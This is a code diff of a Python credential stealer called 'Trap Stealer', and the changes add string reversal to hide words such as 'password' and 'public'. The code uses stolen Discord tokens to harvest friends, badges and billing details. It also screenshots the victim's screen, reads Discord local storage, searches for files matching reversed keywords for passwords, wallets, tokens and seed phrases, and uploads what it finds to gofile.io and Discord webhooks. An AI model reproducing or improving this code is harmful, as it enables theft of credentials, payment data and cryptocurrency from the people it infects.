@@ -122,7 +122,6 @@ def webhook_tools():
         [2] Webhook Deleter
 
         -> ''')
-
         if inputmain == '1':
             url = input(f'Webhook URL : ')
             messages = (f'Message To Spam : ')
@@ -358,7 +357,6 @@ if injection == True:
 else:pass
 
 pas = 'drowssaP'
-
 def systemInfo():
     system = platform.system()
     node_name = platform.node()
@@ -432,14 +430,14 @@ badgeList =  [
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
 
-
+pub = 'cilbup'
 def get_uhq_friends(tokq):
+    
     headers = {
         "Authorization": tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-
     try:
         response = urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers))
         friendslist = json.loads(response.read().decode())
@@ -449,7 +447,7 @@ def get_uhq_friends(tokq):
     uhqlist = ''
     for friend in friendslist:
         owned_badges = ''
-        flags = friend['user']['public_flags']
+        flags = friend['user'][f'{pub[::-1]}_flags']
         for badge in badgeList:
             if flags // badge["Value"] != 0 and friend['type'] == 1:
                 if "House" not in badge["Name"]:
@@ -487,7 +485,8 @@ def get_tokq_info(tokq):
     email = user_info.get("email", "")
     user_id = user_info["id"]
     pfp = user_info["avatar"]
-    flags = user_info["public_flags"]
+
+    flags = user_info[f"{pub[::-1]}_flags"]
     nitro = ""
     phone = "-"
 
@@ -529,7 +528,6 @@ def GetBilling(Tokq):
     
     if not billing_json:
         return " -"
-
     billing = ""
     for method in billing_json:
         if not method["invalid"]:
@@ -537,7 +535,6 @@ def GetBilling(Tokq):
                 billing += ":credit_card:"
             elif method["type"] == 2:
                 billing += ":parking: "
-
     return billing
 
 
@@ -620,13 +617,9 @@ def upload_file(file_path):
         response = requests.post(
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
             files={'file': open(file_path, 'rb')}
-
         )
-
         return response.json()["data"]["downloadPage"]
-    
     except:
-
         return False
 
 
@@ -789,10 +782,7 @@ def steam_st():
                 pass
     except:pass
 
-
-import os
 import concurrent.futures
-from json import dumps
 
 def upload_files_to_discord():
     keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
@@ -858,7 +848,6 @@ def srcs():
         timestamp = str(int(time.time()))
 
         if os.name == "nt":
-            # Windows
             command = ["powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\"{0}\" ); Start-Sleep -m 500; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.width, $screen.height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save(\"{1}\")"]
             command[2] = command[2].format("{PRTSC}", img_path)
         else:
@@ -936,7 +925,7 @@ def paaz():
             "embeds": [
                 {
                     "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"Number of password : {PasswCount}\n{pas[::-1]} File URL : ",
+                    "description": f"Number of {pas[::-1]} : {PasswCount}\n{pas[::-1]} File URL : ",
                     "color": 0xffb6c1,
                     "fields": embed_fields,
                     "thumbnail": {
@@ -970,7 +959,6 @@ def GatherAll():
         [f"{roaming}/discordptb", "/Local Storage/leveldb"],
     ]
     
-    Threadlist = []
     az = threading.Thread(target=upload_files_to_discord)
     az.start()
     Threadlist.append(az)
